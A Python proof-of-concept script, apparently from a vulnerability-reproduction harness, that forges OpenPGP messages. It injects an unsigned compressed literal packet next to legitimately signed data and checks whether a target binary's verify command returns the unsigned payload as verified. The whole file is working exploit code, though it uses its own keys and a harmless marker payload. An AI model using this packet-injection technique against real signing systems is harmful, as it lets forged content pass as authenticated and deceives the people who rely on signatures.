#!/usr/bin/env python3
"""PoC driver: builds a crafted OpenPGP message from a legitimately signed
baseline message (keeping its original signature packet untouched) and reports
what the target binary's `verify` actually returns for it.

Crafted message shape:
    OnePassSignature | LiteralData(baseline) | CompressedData(LiteralData(payload)) | Signature

The signature still covers only the baseline literal data. Depending on the
build, `verify` returns either the embedded payload (from inside the
compressed packet) or the verified baseline data; this script reports
whichever the given binary actually returns, derived purely from its stdout.

Python 3 standard library only.
"""

import argparse
import base64
import json
import os
import struct
import subprocess
import sys
import tempfile
import time
import zlib

BASELINE_DATA = b"Baseline data: this message was legitimately signed.\n"
PAYLOAD_DATA = b"Crafted payload: embedded by poc.py, never signed.\n"


# --------------------------------------------------------------------------
# Minimal OpenPGP packet / armor helpers (stdlib only)
# --------------------------------------------------------------------------

def crc24(data):
    crc = 0xB704CE
    for byte in data:
        crc ^= byte << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= 0x1864CFB
    return crc & 0xFFFFFF


def dearmor(text):
    """Extract the raw packet bytes from an ASCII-armored PGP message."""
    lines = text.splitlines()
    start = None
    for idx, line in enumerate(lines):
        if line.startswith("-----BEGIN"):
            start = idx + 1
            break
    if start is None:
        raise ValueError("no armor begin line found")
    b64_lines = []
    seen_blank = False
    for line in lines[start:]:
        if line.startswith("-----END"):
            break
        if not seen_blank:
            if line.strip() == "":
                seen_blank = True
            continue  # skip armor headers
        if line.strip() == "":
            continue
        if line.startswith("="):
            break  # CRC24 line
        b64_lines.append(line.strip())
    return base64.b64decode("".join(b64_lines))


def armor(raw):
    b64 = base64.b64encode(raw).decode("ascii")
    body = "\n".join(b64[i:i + 64] for i in range(0, len(b64), 64))
    crc = base64.b64encode(crc24(raw).to_bytes(3, "big")).decode("ascii")
    return ("-----BEGIN PGP MESSAGE-----\n\n" + body + "\n=" + crc +
            "\n-----END PGP MESSAGE-----\n")


def parse_packets(raw):
    """Split a packet sequence; returns list of (tag, exact_original_bytes)."""
    packets = []
    i = 0
    n = len(raw)
    while i < n:
        first = raw[i]
        if not (first & 0x80):
            raise ValueError("invalid packet header at offset %d" % i)
        if first & 0x40:  # new-format packet
            tag = first & 0x3F
            hb = raw[i + 1]
            if hb < 192:
                length, hlen = hb, 2
            elif hb < 224:
                length, hlen = ((hb - 192) << 8) + raw[i + 2] + 192, 3
            elif hb == 255:
                length, hlen = int.from_bytes(raw[i + 2:i + 6], "big"), 6
            else:
                raise ValueError("partial body lengths not supported")
        else:  # old-format packet
            tag = (first >> 2) & 0x0F
            ltype = first & 0x03
            if ltype == 0:
                length, hlen = raw[i + 1], 2
            elif ltype == 1:
                length, hlen = int.from_bytes(raw[i + 1:i + 3], "big"), 3
            elif ltype == 2:
                length, hlen = int.from_bytes(raw[i + 1:i + 5], "big"), 5
            else:
                length, hlen = n - i - 1, 1
        end = i + hlen + length
        if end > n:
            raise ValueError("packet overruns buffer at offset %d" % i)
        packets.append((tag, raw[i:end]))
        i = end
    return packets


def new_packet(tag, body):
    ln = len(body)
    if ln < 192:
        header = bytes([0xC0 | tag, ln])
    elif ln < 8384:
        header = bytes([0xC0 | tag, ((ln - 192) >> 8) + 192, (ln - 192) & 0xFF])
    else:
        header = bytes([0xC0 | tag, 255]) + struct.pack(">I", ln)
    return header + body


def literal_packet(data, fmt=b"b", filename=b"", timestamp=0):
    body = fmt + bytes([len(filename)]) + filename + struct.pack(">I", timestamp) + data
    return new_packet(11, body)


def deflate_raw(data):
    comp = zlib.compressobj(6, zlib.DEFLATED, -15)
    return comp.compress(data) + comp.flush()


def inflate_raw(data):
    decomp = zlib.decompressobj(-15)
    out = decomp.decompress(data) + decomp.flush()
    return out


def compressed_packet(inner, algo=2):
    if algo == 0:
        payload = inner
    elif algo == 1:
        payload = deflate_raw(inner)
    elif algo == 2:
        payload = zlib.compress(inner)
    else:
        raise ValueError("unsupported compression algo %d" % algo)
    return new_packet(8, bytes([algo]) + payload)


def decompress_body(body):
    algo = body[0]
    data = body[1:]
    if algo == 0:
        return data
    if algo == 1:
        return inflate_raw(data)
    if algo == 2:
        return zlib.decompress(data)
    raise ValueError("unsupported compression algo %d" % algo)


def build_crafted_message(baseline_raw, payload):
    """Insert CompressedData(LiteralData(payload)) right after the first
    literal data packet of the baseline message, keeping every baseline
    packet (including the signature) byte-for-byte identical."""
    packets = parse_packets(baseline_raw)
    wrapper = compressed_packet(literal_packet(payload), algo=2)
    for idx, (tag, _raw) in enumerate(packets):
        if tag == 11:  # LiteralDataPacket at top level
            return b"".join(p for _t, p in packets[:idx + 1]) + wrapper + \
                   b"".join(p for _t, p in packets[idx + 1:])
    # Fallback: single compressed container (e.g. sign emitted compressed data)
    for idx, (tag, raw_pkt) in enumerate(packets):
        if tag == 8:
            body = packet_body(raw_pkt)
            inner = decompress_body(body)
            crafted_inner = build_crafted_message(inner, payload)
            rebuilt = compressed_packet(crafted_inner, algo=body[0])
            return b"".join(p for _t, p in packets[:idx]) + rebuilt + \
                   b"".join(p for _t, p in packets[idx + 1:])
    raise ValueError("no literal data packet found in baseline message")


def packet_body(raw_pkt):
    """Return the body of a single serialized packet."""
    first = raw_pkt[0]
    if first & 0x40:
        hb = raw_pkt[1]
        if hb < 192:
            return raw_pkt[2:]
        if hb < 224:
            return raw_pkt[3:]
        return raw_pkt[6:]
    ltype = first & 0x03
    if ltype == 0:
        return raw_pkt[2:]
    if ltype == 1:
        return raw_pkt[3:]
    if ltype == 2:
        return raw_pkt[5:]
    return raw_pkt[1:]


# --------------------------------------------------------------------------
# Subprocess driver
# --------------------------------------------------------------------------

def run_cli(binary, args, timeout):
    """Run the target CLI once; return a result dict (never raises)."""
    cmd = [binary] + args
    result = {
        "command": cmd,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "json": None,
        "error": None,
    }
    start = time.monotonic()
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout)
        result["returncode"] = proc.returncode
        if proc.returncode is not None and proc.returncode < 0:
            result["signal"] = -proc.returncode
        result["stdout"] = proc.stdout
        result["stderr"] = proc.stderr
    except subprocess.TimeoutExpired as exc:
        result["timed_out"] = True
        result["error"] = "timed out after %ss" % timeout
        out = exc.stdout or ""
        err = exc.stderr or ""
        result["stdout"] = out.decode("utf-8", "replace") if isinstance(out, bytes) else out
        result["stderr"] = err.decode("utf-8", "replace") if isinstance(err, bytes) else err
    except OSError as exc:
        result["error"] = "failed to execute: %s" % exc
    finally:
        result["runtime_ms"] = int((time.monotonic() - start) * 1000)
    if result["stdout"]:
        try:
            result["json"] = json.loads(result["stdout"])
        except (ValueError, json.JSONDecodeError):
            pass
    return result


def fail_output(binary, error, primary=None):
    observable = {
        "verified": False,
        "data_b64": "",
        "data_text": "",
        "baseline_verified": False,
        "baseline_data_b64": "",
        "baseline_data_text": "",
        "payload_b64": base64.b64encode(PAYLOAD_DATA).decode("ascii"),
        "payload_text": PAYLOAD_DATA.decode("utf-8"),
    }
    out = {
        "binary": binary,
        "command": primary["command"] if primary else [],
        "returncode": primary["returncode"] if primary else None,
        "signal": primary["signal"] if primary else None,
        "timed_out": primary["timed_out"] if primary else False,
        "runtime_ms": primary["runtime_ms"] if primary else 0,
        "stdout": primary["stdout"] if primary else "",
        "stderr": primary["stderr"] if primary else "",
        "observable": {
            "kind": "custom",
            "value": json.dumps(observable),
            "path": None,
        },
        "error": error,
    }
    return out


# --------------------------------------------------------------------------
# Main flow
# --------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description="OpenPGP message-verification PoC driver")
    ap.add_argument("--binary", required=True, help="path to the target CLI binary")
    ap.add_argument("--json-out", default=None, help="optional path to write the JSON report")
    ap.add_argument("--timeout", type=float, default=120.0,
                    help="per-invocation timeout in seconds (default 120)")
    args = ap.parse_args()

    binary = args.binary
    timeout = args.timeout
    report = None

    with tempfile.TemporaryDirectory(prefix="poc-openpgp-") as work:
        keys_dir = os.path.join(work, "keys")
        os.makedirs(keys_dir, exist_ok=True)
        priv = os.path.join(keys_dir, "poc-private.asc")
        pub = os.path.join(keys_dir, "poc-public.asc")
        data_file = os.path.join(work, "baseline-data.txt")
        baseline_msg = os.path.join(work, "baseline.asc")
        crafted_msg = os.path.join(work, "crafted.asc")

        with open(data_file, "wb") as fh:
            fh.write(BASELINE_DATA)

        # 1. keygen
        step = run_cli(binary, ["keygen", "--out-dir", keys_dir, "--name", "poc"], timeout)
        if step["error"] or not step["json"] or not step["json"].get("ok"):
            report = fail_output(binary, "keygen failed: %s" % (step["error"] or step["stdout"] or step["stderr"]), step)
        else:
            priv = step["json"].get("private_key_file", priv)
            pub = step["json"].get("public_key_file", pub)
            if not os.path.isabs(priv):
                priv = os.path.join(os.getcwd(), priv)
            if not os.path.isabs(pub):
                pub = os.path.join(os.getcwd(), pub)

        # 2. sign baseline data
        if report is None:
            step = run_cli(binary, ["sign", "--key", priv, "--data", data_file,
                                    "--out", baseline_msg], timeout)
            if step["error"] or not step["json"] or not step["json"].get("ok"):
                report = fail_output(binary, "sign failed: %s" % (step["error"] or step["stdout"] or step["stderr"]), step)

        # 3. verify baseline message
        baseline_res = None
        if report is None:
            baseline_res = run_cli(binary, ["verify", "--message", baseline_msg,
                                            "--key", pub], timeout)
            if baseline_res["error"] or not baseline_res["json"]:
                report = fail_output(binary, "baseline verify failed: %s" % (baseline_res["error"] or baseline_res["stderr"]), baseline_res)

        # 4. build crafted message from the baseline packets
        if report is None:
            try:
                with open(baseline_msg, "r") as fh:
                    baseline_raw = dearmor(fh.read())
                crafted_raw = build_crafted_message(baseline_raw, PAYLOAD_DATA)
                # sanity: every baseline packet must still be present verbatim
                for _tag, pkt in parse_packets(baseline_raw):
                    if pkt not in crafted_raw:
                        raise ValueError("baseline packet material was altered")
                with open(crafted_msg, "w") as fh:
                    fh.write(armor(crafted_raw))
            except (ValueError, OSError) as exc:
                report = fail_output(binary, "failed to build crafted message: %s" % exc, baseline_res)

        # 5. verify crafted message (primary evidence subprocess)
        if report is None:
            crafted_res = run_cli(binary, ["verify", "--message", crafted_msg,
                                           "--key", pub], timeout)
            cjson = crafted_res["json"] or {}
            bjson = baseline_res["json"] or {}
            cdata = cjson.get("data") or {}
            bdata = bjson.get("data") or {}

            error = None
            if crafted_res["error"]:
                error = "crafted verify: %s" % crafted_res["error"]
            elif not cjson:
                error = "crafted verify produced no JSON output"
            elif not cjson.get("ok"):
                error = "crafted verify reported error: %s" % cjson.get("error")
            elif "verified" not in cjson or not cdata:
                error = "crafted verify output missing verification fields"

            def data_text(field):
                text = field.get("text")
                if text is not None:
                    return text
                b64 = field.get("b64", "")
                try:
                    return base64.b64decode(b64).decode("utf-8", "replace")
                except (ValueError, TypeError):
                    return ""

            observable = {
                "verified": bool(cjson.get("verified", False)),
                "data_b64": cdata.get("b64", ""),
                "data_text": data_text(cdata),
                "baseline_verified": bool(bjson.get("verified", False)),
                "baseline_data_b64": bdata.get("b64", ""),
                "baseline_data_text": data_text(bdata),
                "payload_b64": base64.b64encode(PAYLOAD_DATA).decode("ascii"),
                "payload_text": PAYLOAD_DATA.decode("utf-8"),
            }
            report = {
                "binary": binary,
                "command": crafted_res["command"],
                "returncode": crafted_res["returncode"],
                "signal": crafted_res["signal"],
                "timed_out": crafted_res["timed_out"],
                "runtime_ms": crafted_res["runtime_ms"],
                "stdout": crafted_res["stdout"],
                "stderr": crafted_res["stderr"],
                "observable": {
                    "kind": "custom",
                    "value": json.dumps(observable),
                    "path": None,
                },
                "error": error,
            }

    text = json.dumps(report)
    print(text)
    if args.json_out:
        with open(args.json_out, "w") as fh:
            fh.write(text + "\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
